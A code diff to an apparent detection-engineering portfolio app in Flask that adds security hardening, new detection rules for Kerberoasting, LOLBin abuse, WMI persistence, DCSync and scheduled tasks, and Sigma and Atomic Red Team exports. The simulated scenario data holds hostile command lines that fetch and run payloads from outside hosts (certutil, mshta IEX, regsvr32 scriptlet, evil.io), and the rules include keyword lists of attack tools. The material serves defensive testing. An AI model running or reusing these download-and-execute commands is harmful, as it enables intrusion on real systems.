@@ -4,7 +4,9 @@ Portfolio project for Detection Engineer role
 Demonstrates: SIEM rule logic, threat intel integration, log analysis, MITRE ATT&CK mapping
 """
 
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, abort
+import os, time, html, ipaddress
+from functools import wraps
 from flask_cors import CORS
 import requests
 import re
@@ -15,7 +17,125 @@ from datetime import datetime, timedelta
 from collections import defaultdict, Counter
 
 app = Flask(__name__)
-CORS(app)
+
+# ─────────────────────────────────────────────
+# SECURITY HARDENING
+# ─────────────────────────────────────────────
+# Max request body: 64 KB — prevents memory exhaustion DoS
+app.config['MAX_CONTENT_LENGTH'] = 64 * 1024
+
+# CORS — restrict origins (portfolio: allow GitHub Pages + localhost)
+CORS(app, origins=["https://krutik2907.github.io", "http://localhost"],
+     methods=["GET", "POST"], max_age=600)
+
+# ── Rate Limiter (in-memory, per-IP) ──────────────────────────
+# Defends against: T1498 (DoS), T1110 (API brute force), T1190 (automated scanning)
+_rate_store = defaultdict(list)
+RATE_LIMIT = 60
+RATE_WINDOW = 60
+
+def get_client_ip():
+    xff = request.headers.get("X-Forwarded-For", "")
+    if xff:
+        candidate = xff.split(",")[0].strip()
+        try:
+            ipaddress.ip_address(candidate)
+            return candidate
+        except ValueError:
+            pass
+    return request.remote_addr or "unknown"
+
+def rate_limit(fn):
+    """Rate-limit decorator — 60 req/min per IP"""
+    @wraps(fn)
+    def wrapper(*args, **kwargs):
+        ip = get_client_ip()
+        now = time.time()
+        _rate_store[ip] = [t for t in _rate_store[ip] if now - t < RATE_WINDOW]
+        if len(_rate_store[ip]) >= RATE_LIMIT:
+            remaining = int(RATE_WINDOW - (now - _rate_store[ip][0]))
+            return jsonify({"error": "Rate limit exceeded", "retry_after_s": remaining}), 429
+        _rate_store[ip].append(now)
+        return fn(*args, **kwargs)
+    return wrapper
+
+# ── Security headers — added to every response ────────────────
+# Mitigates: T1189 (drive-by), T1185 (session hijack), clickjacking, XSS, MIME sniff
+@app.after_request
+def add_security_headers(response):
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-Frame-Options"] = "DENY"
+    response.headers["X-XSS-Protection"] = "1; mode=block"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
+    response.headers["Content-Security-Policy"] = "default-src 'none'; frame-ancestors 'none';"
+    # Remove server fingerprinting — T1592 (recon prevention)
+    response.headers.pop("Server", None)
+    response.headers.pop("X-Powered-By", None)
+    return response
+
+# ── Input sanitisation ─────────────────────────────────────────
+# Guards against: T1059 (injection), T1190 (web exploit), log injection, path traversal
+MAX_IOC_LEN   = 512
+MAX_QUERY_LEN = 2048
+MAX_TEXT_LEN  = 4096
+
+_IOC_PATTERN = re.compile(
+    r"^(?:"
+    r"(?:[0-9]{1,3}[.]){3}[0-9]{1,3}"       # IPv4
+    r"|[a-fA-F0-9]{32,64}"                    # MD5 / SHA256
+    r"|(?:[a-zA-Z0-9-]+[.])+[a-zA-Z]{2,63}"  # domain
+    r"|https?://[\w./:%@?=&#-]+"             # URL
+    r")$"
+)
+
+_INTERNAL_NETS = [
+    ipaddress.ip_network("10.0.0.0/8"),
+    ipaddress.ip_network("172.16.0.0/12"),
+    ipaddress.ip_network("192.168.0.0/16"),
+    ipaddress.ip_network("127.0.0.0/8"),
+    ipaddress.ip_network("169.254.0.0/16"),
+]
+
+def is_internal_ip(addr):
+    try:
+        ip = ipaddress.ip_address(addr)
+        return any(ip in net for net in _INTERNAL_NETS)
+    except ValueError:
+        return False
+
+def sanitise_string(s, max_len=512, strip_html=True):
+    """Truncate, strip HTML, remove control chars — prevents log injection (T1562.006)"""
+    if not isinstance(s, str):
+        return ""
+    s = s[:max_len]
+    if strip_html:
+        s = html.escape(s)
+    # Remove null bytes, ANSI escape codes
+    s = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", s)
+    return s.strip()
+
+def require_json(fn):
+    """Enforce Content-Type: application/json on POST requests"""
+    @wraps(fn)
+    def wrapper(*args, **kwargs):
+        if request.method == "POST" and not request.is_json:
+            return jsonify({"error": "Content-Type must be application/json"}), 415
+        return fn(*args, **kwargs)
+    return wrapper
+
+def audit_log(event, detail=""):
+    """Structured audit log to stdout (collected by Render)"""
+    ip = get_client_ip()
+    detail_safe = re.sub(r"[\n\r\t]", " ", str(detail))[:256]
+    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
+    print(f"[AUDIT] ts={ts} ip={ip} event={event} detail={detail_safe}")
+
+VALID_SCENARIOS = frozenset({
+    "powershell","bruteforce","dns_tunneling","lateral","ransomware",
+    "kerberoasting","lolbin","wmi_persistence","dcsync","scheduled_task"
+})
+
 
 # ─────────────────────────────────────────────
 # DETECTION ENGINE — Core rule matching logic
@@ -217,6 +337,124 @@ def rule_mass_file_encryption(events):
     return matches
 
 
+def rule_kerberoasting(events):
+    """Detect Kerberoasting — TGS requests for service accounts (T1558.003)"""
+    matches = []
+    tgs_events = [e for e in events
+                  if e.get("event_id") == 4769
+                  and e.get("ticket_encryption") in ("0x17", "0x18")
+                  and not e.get("service_name", "").endswith("$")]
+    by_user = defaultdict(list)
+    for e in tgs_events:
+        by_user[e.get("user", "?")].append(e)
+    for user, reqs in by_user.items():
+        unique_svcs = set(e.get("service_name", "?") for e in reqs)
+        if len(unique_svcs) >= 3:
+            matches.append({
+                "user": user,
+                "src_host": reqs[0].get("src_host", "?"),
+                "services_targeted": list(unique_svcs),
+                "ticket_count": len(reqs),
+                "encryption_type": "RC4 (0x17) — crackable offline",
+                "timestamp": reqs[0].get("timestamp"),
+                "risk_score": min(100, 55 + len(unique_svcs) * 10)
+            })
+    return matches
+
+
+def rule_lolbin_abuse(events):
+    """Detect LOLBin abuse — certutil, mshta, regsvr32 etc. (T1218)"""
+    LOLBINS = {
+        "certutil.exe": ["-urlcache", "-decode", "-encode"],
+        "mshta.exe": ["http://", "https://", "vbscript:", "javascript:"],
+        "regsvr32.exe": ["scrobj.dll", "http"],
+        "rundll32.exe": ["javascript:", "shell32", "http"],
+        "wmic.exe": ["process call create", "/node:"],
+        "bitsadmin.exe": ["/transfer", "/download"],
+        "msiexec.exe": ["/i http", "\\\\"],
+    }
+    matches = []
+    proc_events = [e for e in events if e.get("event_id") in (1, 4688)]
+    for e in proc_events:
+        process = e.get("process", e.get("new_process_name", "")).lower().split("\\")[-1]
+        cmd = e.get("command_line", "").lower()
+        if process in LOLBINS:
+            flags = [f for f in LOLBINS[process] if f.lower() in cmd]
+            if flags:
+                e["lolbin"] = process
+                e["suspicious_flags"] = flags
+                e["risk_score"] = 70 + len(flags) * 8
+                matches.append(e)
+    return matches
+
+
+def rule_wmi_persistence(events):
+    """Detect WMI event subscription persistence (T1546.003)"""
+    matches = []
+    wmi_events = [e for e in events if e.get("event_id") in (19, 20, 21)
+                  or e.get("event_type") == "wmi_subscription"]
+    for e in wmi_events:
+        consumer = e.get("consumer_name", e.get("consumer", "")).lower()
+        legit = ["scm event log consumer", "nteventsink", "sccm"]
+        if not any(l in consumer for l in legit):
+            e["risk_score"] = 85
+            e["persistence_type"] = "WMI Event Subscription"
+            matches.append(e)
+    proc_events = [e for e in events if e.get("event_id") in (1, 4688)]
+    for e in proc_events:
+        cmd = e.get("command_line", "").lower()
+        if "wmic" in cmd and any(k in cmd for k in ["subscription", "eventfilter", "eventconsumer"]):
+            e["risk_score"] = 90
+            e["persistence_type"] = "WMI Subscription via CLI"
+            matches.append(e)
+    return matches
+
+
+def rule_dcsync(events):
+    """Detect DCSync attack — replication from non-DC (T1003.006)"""
+    matches = []
+    repl_events = [e for e in events
+                   if e.get("event_id") == 4662
+                   and "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" in e.get("properties", "")]
+    known_dcs = ["DC01", "DC02", "DC03", "ADDC"]
+    for e in repl_events:
+        src = e.get("src_host", "")
+        if not any(dc.lower() in src.lower() for dc in known_dcs):
+            e["risk_score"] = 98
+            e["attack"] = "DCSync — non-DC requesting AD replication"
+            matches.append(e)
+    return matches
+
+
+def rule_scheduled_task_persistence(events):
+    """Detect malicious scheduled task creation (T1053.005)"""
+    matches = []
+    task_events = [e for e in events if e.get("event_id") in (4698, 4702)]
+    for e in task_events:
+        content = e.get("task_content", e.get("command_line", "")).lower()
+        flags = []
+        if any(x in content for x in ["powershell", "cmd.exe", "wscript", "mshta"]): flags.append("shell_in_task")
+        if any(x in content for x in ["temp", "appdata", "public", "programdata"]): flags.append("temp_path")
+        if any(x in content for x in ["-enc", "-nop", "bypass", "hidden"]): flags.append("obfuscation")
+        if any(x in content for x in ["http://", "https://", "\\\\"]): flags.append("network_ref")
+        if len(flags) >= 2:
+            e["suspicious_indicators"] = flags
+            e["risk_score"] = 65 + len(flags) * 8
+            matches.append(e)
+    proc_events = [e for e in events if e.get("event_id") in (1, 4688)]
+    for e in proc_events:
+        cmd = e.get("command_line", "").lower()
+        if "schtasks" in cmd and "/create" in cmd:
+            flags = []
+            if any(x in cmd for x in ["powershell", "cmd", "mshta"]): flags.append("shell_in_task")
+            if any(x in cmd for x in ["appdata", "temp", "public"]): flags.append("suspicious_path")
+            if flags:
+                e["suspicious_indicators"] = flags
+                e["risk_score"] = 75
+                matches.append(e)
+    return matches
+
+
 # ─────────────────────────────────────────────
 # DETECTION ENGINE REGISTRY
 # ─────────────────────────────────────────────
@@ -246,6 +484,26 @@ DETECTION_RULES = [
     DetectionRule("DR-006", "Mass File Encryption (Ransomware)", "T1486",
                   "Impact", "Critical", rule_mass_file_encryption,
                   "10+ file renames to ransomware extensions from single process"),
+
+    DetectionRule("DR-007", "Kerberoasting Attack", "T1558.003",
+                  "Credential Access", "High", rule_kerberoasting,
+                  "RC4 TGS tickets for 3+ service accounts by same user — offline crackable"),
+
+    DetectionRule("DR-008", "LOLBin Abuse", "T1218",
+                  "Defense Evasion", "High", rule_lolbin_abuse,
+                  "Living-off-the-land binaries (certutil/mshta/regsvr32) with suspicious args"),
+
+    DetectionRule("DR-009", "WMI Persistence", "T1546.003",
+                  "Persistence", "High", rule_wmi_persistence,
+                  "WMI event subscription created by non-standard consumer process"),
+
+    DetectionRule("DR-010", "DCSync Attack", "T1003.006",
+                  "Credential Access", "Critical", rule_dcsync,
+                  "AD directory replication rights exercised from non-DC host"),
+
+    DetectionRule("DR-011", "Scheduled Task Persistence", "T1053.005",
+                  "Persistence", "High", rule_scheduled_task_persistence,
+                  "Scheduled task created with shell, obfuscation, or network-fetch indicators"),
 ]
 
 
@@ -322,7 +580,66 @@ def generate_scenario_events(scenario):
              "src_host": "FILE-SERVER-01",
              "command_line": "bcdedit /set {default} recoveryenabled No",
              "timestamp": base_ts(115)},
-        ]
+        ],
+        "kerberoasting": [
+            *[{"event_id": 4769, "user": "john.doe", "src_host": "WORKSTATION-04",
+               "service_name": svc, "ticket_encryption": "0x17",
+               "dest_host": "DC01", "timestamp": base_ts(300 - i * 15)}
+              for i, svc in enumerate(["MSSQLSvc/db01.corp.local:1433",
+                                       "HTTP/webserver.corp.local",
+                                       "CIFS/fileserver.corp.local",
+                                       "HOST/printserver.corp.local"])],
+        ],
+        "lolbin": [
+            {"event_id": 4688, "process": "certutil.exe", "user": "jane.smith",
+             "src_host": "WORKSTATION-07",
+             "command_line": "certutil.exe -urlcache -split -f http://185.220.101.45/payload.exe C:\\Users\\Public\\payload.exe",
+             "timestamp": base_ts(60)},
+            {"event_id": 4688, "process": "mshta.exe", "user": "jane.smith",
+             "src_host": "WORKSTATION-07",
+             "command_line": "mshta.exe vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://185.220.101.45/stager.ps1\')\")(window.close)",
+             "timestamp": base_ts(45)},
+            {"event_id": 1, "process": "regsvr32.exe", "user": "jane.smith",
+             "src_host": "WORKSTATION-07",
+             "command_line": "regsvr32.exe /s /u /i:http://185.220.101.45/payload.sct scrobj.dll",
+             "timestamp": base_ts(30)},
+        ],
+        "wmi_persistence": [
+            {"event_id": 19, "event_type": "wmi_subscription",
+             "consumer_name": "WindowsUpdaterConsumer",
+             "consumer": "powershell.exe -nop -enc JABjAGwAaQBlAG4AdA==",
+             "filter_name": "SystemStartupFilter",
+             "src_host": "WORKSTATION-09", "user": "SYSTEM",
+             "timestamp": base_ts(120)},
+            {"event_id": 20, "event_type": "wmi_subscription",
+             "consumer_name": "BackupConsumer",
+             "consumer": "cmd.exe /c certutil -urlcache -f http://evil.io/b.exe %TEMP%\\svc.exe",
+             "filter_name": "OnLogonFilter",
+             "src_host": "WORKSTATION-09", "user": "SYSTEM",
+             "timestamp": base_ts(100)},
+        ],
+        "dcsync": [
+            {"event_id": 4662, "src_host": "WORKSTATION-11",
+             "user": "corp\\john.doe",
+             "properties": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 DS-Replication-Get-Changes",
+             "object": "DC=corp,DC=local",
+             "timestamp": base_ts(30)},
+            {"event_id": 4662, "src_host": "WORKSTATION-11",
+             "user": "corp\\john.doe",
+             "properties": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 DS-Replication-Get-Changes-All",
+             "object": "DC=corp,DC=local",
+             "timestamp": base_ts(28)},
+        ],
+        "scheduled_task": [
+            {"event_id": 4698, "user": "helpdesk01", "src_host": "WORKSTATION-03",
+             "task_name": "\\Microsoft\\Windows\\WindowsUpdate\\Updater",
+             "task_content": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA= /tr C:\\Users\\Public\\svc.exe /sc onlogon",
+             "timestamp": base_ts(90)},
+            {"event_id": 4688, "process": "schtasks.exe", "user": "helpdesk01",
+             "src_host": "WORKSTATION-03",
+             "command_line": "schtasks /create /tn WindowsDefenderUpdate /tr \"C:\\Users\\Public\\AppData\\update.exe\" /sc onlogon /ru SYSTEM",
+             "timestamp": base_ts(85)},
+        ],
     }
     return scenarios.get(scenario, [])
 
@@ -356,6 +673,11 @@ MITRE_COVERAGE = [
     {"id": "T1082", "name": "System Info Discovery", "tactic": "Discovery", "status": "uncovered", "rules": []},
     {"id": "T1490", "name": "Inhibit System Recovery", "tactic": "Impact", "status": "covered", "rules": ["DR-006"]},
     {"id": "T1204.001", "name": "Malicious Link", "tactic": "Execution", "status": "uncovered", "rules": []},
+    {"id": "T1558.003", "name": "Kerberoasting", "tactic": "Credential Access", "status": "covered", "rules": ["DR-007"]},
+    {"id": "T1218", "name": "LOLBin Abuse", "tactic": "Defense Evasion", "status": "covered", "rules": ["DR-008"]},
+    {"id": "T1546.003", "name": "WMI Persistence", "tactic": "Persistence", "status": "covered", "rules": ["DR-009"]},
+    {"id": "T1003.006", "name": "DCSync", "tactic": "Credential Access", "status": "covered", "rules": ["DR-010"]},
+    {"id": "T1053.005", "name": "Scheduled Task", "tactic": "Persistence", "status": "covered", "rules": ["DR-011"]},
 ]
 
 
@@ -364,13 +686,15 @@ MITRE_COVERAGE = [
 # ─────────────────────────────────────────────
 
 @app.route("/api/health")
+@rate_limit
 def health():
-    return jsonify({"status": "ok", "engine": "Detection Lab v1.0",
+    return jsonify({"status": "ok", "engine": "Detection Lab v2.0",
                     "rules_loaded": len(DETECTION_RULES),
                     "techniques_mapped": len(MITRE_COVERAGE)})
 
 
 @app.route("/api/threat-intel")
+@rate_limit
 def threat_intel():
     """Fetch live threat intel from abuse.ch URLhaus"""
     try:
@@ -412,12 +736,21 @@ def threat_intel():
 
 
 @app.route("/api/check-ioc", methods=["POST"])
+@rate_limit
+@require_json
 def check_ioc():
     """Check an IP/domain against threat intel sources"""
     data = request.json or {}
-    ioc = data.get("ioc", "").strip()
+    ioc = sanitise_string(data.get("ioc", ""), max_len=MAX_IOC_LEN)
     if not ioc:
         return jsonify({"error": "No IOC provided"}), 400
+    if not _IOC_PATTERN.match(ioc):
+        audit_log("invalid_ioc", ioc[:64])
+        return jsonify({"error": "Invalid IOC format. Accepted: IPv4, domain, URL, MD5/SHA256"}), 422
+    if is_internal_ip(ioc):
+        audit_log("ssrf_attempt", ioc[:64])
+        return jsonify({"error": "Internal IPs rejected — SSRF not today"}), 422
+    audit_log("ioc_check", ioc[:64])
 
     # Simulate IOC enrichment (in production: query VirusTotal, OTX, etc.)
     known_malicious_patterns = ["185.220.101", "203.0.113", "malware", "evil-c2", "payload-delivery",
@@ -438,10 +771,16 @@ def check_ioc():
 
 
 @app.route("/api/simulate", methods=["POST"])
+@rate_limit
+@require_json
 def simulate():
     """Run attack simulation and return detection results"""
     data = request.json or {}
-    scenario = data.get("scenario", "powershell")
+    raw = sanitise_string(data.get("scenario", ""), max_len=64)
+    if raw not in VALID_SCENARIOS:
+        return jsonify({"error": f"Unknown scenario. Valid: {sorted(VALID_SCENARIOS)}"}), 422
+    scenario = raw
+    audit_log("simulate", scenario)
 
     events = generate_scenario_events(scenario)
     all_alerts = []
@@ -476,6 +815,7 @@ def simulate():
 
 
 @app.route("/api/rules")
+@rate_limit
 def get_rules():
     """Return all detection rules"""
     return jsonify([{
@@ -490,10 +830,12 @@ def get_rules():
 
 
 @app.route("/api/validate-rule", methods=["POST"])
+@rate_limit
+@require_json
 def validate_rule():
     """Validate a SIEM rule query for syntax and best practices"""
     data = request.json or {}
-    query = data.get("query", "")
+    query = sanitise_string(data.get("query", ""), max_len=MAX_QUERY_LEN)
     checks = []
 
     checks.append({"check": "Pipeline operators", "pass": "|" in query,
@@ -514,6 +856,7 @@ def validate_rule():
 
 
 @app.route("/api/mitre-coverage")
+@rate_limit
 def mitre_coverage():
     """Return MITRE ATT&CK coverage heatmap data"""
     covered = sum(1 for t in MITRE_COVERAGE if t["status"] == "covered")
@@ -533,10 +876,12 @@ def mitre_coverage():
 
 
 @app.route("/api/entropy", methods=["POST"])
+@rate_limit
+@require_json
 def entropy_api():
     """Calculate Shannon entropy of a given string"""
     data = request.json or {}
-    text = data.get("text", "")
+    text = sanitise_string(data.get("text", ""), max_len=MAX_TEXT_LEN, strip_html=False)
     if not text:
         return jsonify({"error": "No text provided"}), 400
     score = calculate_entropy(text)
@@ -546,6 +891,188 @@ def entropy_api():
     return jsonify({"text_length": len(text), "entropy": round(score, 4),
                     "verdict": verdict,
                     "bits_per_char": round(score, 4)})
+
+
+@app.route("/api/sigma/<rule_id>")
+@rate_limit
+def export_sigma(rule_id):
+    # Path traversal guard (T1083/T1190)
+    rule_id = re.sub(r"[^A-Z0-9-]", "", rule_id.upper())[:10]
+    """Export a detection rule as a Sigma YAML rule"""
+    rule = next((r for r in DETECTION_RULES if r.rule_id == rule_id), None)
+    if not rule:
+        return jsonify({"error": f"Rule {rule_id} not found"}), 404
+
+    # Map severity to Sigma levels
+    sev_map = {"Critical": "critical", "High": "high", "Medium": "medium", "Low": "low"}
+    
+    # Build logsource based on tactic
+    logsource_map = {
+        "Execution": {"category": "process_creation", "product": "windows"},
+        "Credential Access": {"category": "security", "product": "windows"},
+        "Command & Control": {"category": "dns", "product": "windows"},
+        "Lateral Movement": {"category": "security", "product": "windows"},
+        "Impact": {"category": "file_event", "product": "windows"},
+        "Defense Evasion": {"category": "process_creation", "product": "windows"},
+        "Persistence": {"category": "registry_event", "product": "windows"},
+    }
+    logsource = logsource_map.get(rule.tactic, {"category": "security", "product": "windows"})
+
+    # Detection condition per rule
+    detection_map = {
+        "DR-001": {
+            "selection": {"CommandLine|contains|all": ["-enc", "-nop"]},
+            "filter": {"User|contains": ["svc_deploy"]},
+            "condition": "selection and not filter"
+        },
+        "DR-002": {"selection": {"EventID": 4625, "LogonType": 10}, "condition": "selection | count() by IpAddress > 10"},
+        "DR-003": {"selection": {"QueryName|re": "[A-Za-z0-9+/]{25,}\\."}, "condition": "selection | count() by QueryName > 20"},
+        "DR-004": {"selection": {"EventID": 10, "TargetImage|endswith": "lsass.exe", "GrantedAccess|contains": ["0x1010", "0x143a"]}, "condition": "selection"},
+        "DR-005": {"selection": {"EventID": 4624, "LogonType": 3, "AuthenticationPackageName": "NTLM"}, "condition": "selection | count() by SubjectUserName > 3"},
+        "DR-006": {"selection": {"TargetFilename|endswith": [".locked", ".encrypted", ".wncry", ".cerber"]}, "condition": "selection | count() by ProcessId > 20"},
+        "DR-007": {"selection": {"EventID": 4769, "TicketEncryptionType": "0x17"}, "condition": "selection | count() by SubjectUserName > 3"},
+        "DR-008": {"selection": {"Image|endswith": ["certutil.exe", "mshta.exe", "regsvr32.exe"], "CommandLine|contains": ["-urlcache", "http://", "scrobj.dll"]}, "condition": "selection"},
+        "DR-009": {"selection": {"EventID": [19, 20, 21]}, "filter": {"Consumer|contains": ["scm event log consumer"]}, "condition": "selection and not filter"},
+        "DR-010": {"selection": {"EventID": 4662, "Properties|contains": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"}, "condition": "selection"},
+        "DR-011": {"selection": {"EventID": [4698, 4702], "TaskContent|contains": ["powershell", "cmd.exe", "appdata"]}, "condition": "selection"},
+    }
+
+    detection = detection_map.get(rule_id, {"selection": {"EventID": 4688}, "condition": "selection"})
+
+    import yaml
+    sigma = {
+        "title": rule.name,
+        "id": f"det-lab-{rule_id.lower()}",
+        "status": "experimental",
+        "description": rule.description,
+        "references": [f"https://attack.mitre.org/techniques/{rule.mitre_id.replace('.', '/')}/"],
+        "author": "Krutik — Detection Engineering Lab",
+        "date": "2024/03/15",
+        "modified": "2024/03/15",
+        "tags": [
+            f"attack.{rule.tactic.lower().replace(' ', '_').replace('&', 'and')}",
+            f"attack.{rule.mitre_id.lower()}"
+        ],
+        "logsource": logsource,
+        "detection": detection,
+        "falsepositives": ["Legitimate administrative activity", "Security scanning tools"],
+        "level": sev_map.get(rule.severity, "medium")
+    }
+
+    yaml_str = yaml.dump(sigma, default_flow_style=False, allow_unicode=True, sort_keys=False)
+    from flask import Response
+    return Response(yaml_str, mimetype="text/yaml",
+                    headers={"Content-Disposition": f"attachment; filename={rule_id}_sigma.yml"})
+
+
+@app.route("/api/sigma-all")
+@rate_limit
+def export_all_sigma():
+    """Export all rules as Sigma YAML bundle"""
+    rule_ids = [r.rule_id for r in DETECTION_RULES]
+    rules_yaml = []
+    for rid in rule_ids:
+        with app.test_request_context():
+            resp = export_sigma(rid)
+            if hasattr(resp, 'get_data'):
+                rules_yaml.append(resp.get_data(as_text=True))
+    bundle = "---\n".join(rules_yaml)
+    from flask import Response
+    return Response(bundle, mimetype="text/yaml",
+                    headers={"Content-Disposition": "attachment; filename=detection_lab_sigma_bundle.yml"})
+
+
+@app.route("/api/atomic-red-team")
+@rate_limit
+def atomic_red_team():
+    """Return Atomic Red Team test IDs mapped to each detection rule"""
+    art_mapping = [
+        {"rule_id": "DR-001", "rule_name": "Obfuscated PowerShell", "mitre": "T1059.001",
+         "art_tests": [
+             {"test_id": "T1059.001-1", "name": "Mimikatz PowerShell", "executor": "powershell"},
+             {"test_id": "T1059.001-2", "name": "Run BloodHound from Memory", "executor": "powershell"},
+             {"test_id": "T1059.001-4", "name": "Encoded PowerShell Command", "executor": "command_prompt"},
+         ]},
+        {"rule_id": "DR-002", "rule_name": "RDP Brute Force", "mitre": "T1110.001",
+         "art_tests": [
+             {"test_id": "T1110.001-1", "name": "Password Brute Force via SSH", "executor": "bash"},
+             {"test_id": "T1110.001-2", "name": "Password Brute Force via RDP", "executor": "command_prompt"},
+         ]},
+        {"rule_id": "DR-003", "rule_name": "DNS Tunneling", "mitre": "T1071.004",
+         "art_tests": [
+             {"test_id": "T1071.004-1", "name": "DNS Large Query", "executor": "command_prompt"},
+             {"test_id": "T1071.004-3", "name": "DNS C2 via dnscat2", "executor": "bash"},
+         ]},
+        {"rule_id": "DR-004", "rule_name": "LSASS Memory Access", "mitre": "T1003.001",
+         "art_tests": [
+             {"test_id": "T1003.001-1", "name": "Windows Credential Editor", "executor": "command_prompt"},
+             {"test_id": "T1003.001-2", "name": "Dump LSASS.exe via ProcDump", "executor": "command_prompt"},
+             {"test_id": "T1003.001-5", "name": "Dump LSASS via comsvcs.dll", "executor": "command_prompt"},
+         ]},
+        {"rule_id": "DR-005", "rule_name": "Pass-the-Hash", "mitre": "T1550.002",
+         "art_tests": [
+             {"test_id": "T1550.002-1", "name": "Mimikatz Pass-the-Hash", "executor": "command_prompt"},
+             {"test_id": "T1550.002-2", "name": "crackmapexec Pass-the-Hash", "executor": "bash"},
+         ]},
+        {"rule_id": "DR-006", "rule_name": "Ransomware File Encryption", "mitre": "T1486",
+         "art_tests": [
+             {"test_id": "T1486-1", "name": "Ransomware — Encrypt files using OpenSSL", "executor": "bash"},
+             {"test_id": "T1490-1", "name": "Delete Volume Shadow Copies", "executor": "command_prompt"},
+         ]},
+        {"rule_id": "DR-007", "rule_name": "Kerberoasting", "mitre": "T1558.003",
+         "art_tests": [
+             {"test_id": "T1558.003-1", "name": "Request for All Service Principle Names", "executor": "powershell"},
+             {"test_id": "T1558.003-3", "name": "Rubeus kerberoasting", "executor": "powershell"},
+         ]},
+        {"rule_id": "DR-008", "rule_name": "LOLBin Abuse", "mitre": "T1218",
+         "art_tests": [
+             {"test_id": "T1218.001-1", "name": "Compile After Delivery via Csc.exe", "executor": "command_prompt"},
+             {"test_id": "T1218.003-1", "name": "CMSTP Bypass UAC", "executor": "command_prompt"},
+             {"test_id": "T1218.010-1", "name": "Regsvr32 remote COM scriptlet", "executor": "command_prompt"},
+         ]},
+        {"rule_id": "DR-009", "rule_name": "WMI Persistence", "mitre": "T1546.003",
+         "art_tests": [
+             {"test_id": "T1546.003-1", "name": "Persistence via WMI Event Subscription", "executor": "powershell"},
+             {"test_id": "T1546.003-2", "name": "Persistence via WMI subscription — CommandLineEventConsumer", "executor": "powershell"},
+         ]},
+        {"rule_id": "DR-010", "rule_name": "DCSync Attack", "mitre": "T1003.006",
+         "art_tests": [
+             {"test_id": "T1003.006-1", "name": "DCSync (Active Directory)", "executor": "command_prompt"},
+             {"test_id": "T1003.006-2", "name": "DCSync via mimikatz lsadump", "executor": "command_prompt"},
+         ]},
+        {"rule_id": "DR-011", "rule_name": "Scheduled Task Persistence", "mitre": "T1053.005",
+         "art_tests": [
+             {"test_id": "T1053.005-1", "name": "Scheduled Task Startup Script", "executor": "command_prompt"},
+             {"test_id": "T1053.005-4", "name": "Powershell Cmdlet Scheduled Task", "executor": "powershell"},
+         ]},
+    ]
+    return jsonify({"total_rules": len(art_mapping), "mappings": art_mapping})
+
+
+
+# ─────────────────────────────────────────────
+# GLOBAL ERROR HANDLERS — never leak stack traces
+# ─────────────────────────────────────────────
+
+@app.errorhandler(400)
+def bad_request(e): return jsonify({"error": "Bad request"}), 400
+
+@app.errorhandler(404)
+def not_found(e): return jsonify({"error": "Endpoint not found"}), 404
+
+@app.errorhandler(405)
+def method_not_allowed(e): return jsonify({"error": "Method not allowed"}), 405
+
+@app.errorhandler(413)
+def too_large(e): return jsonify({"error": "Request body too large (max 64 KB)"}), 413
+
+@app.errorhandler(429)
+def too_many(e): return jsonify({"error": "Too many requests"}), 429
+
+@app.errorhandler(500)
+def server_error(e):
+    audit_log("internal_error", str(e)[:64])
+    return jsonify({"error": "Internal server error"}), 500
 
 
 if __name__ == "__main__":
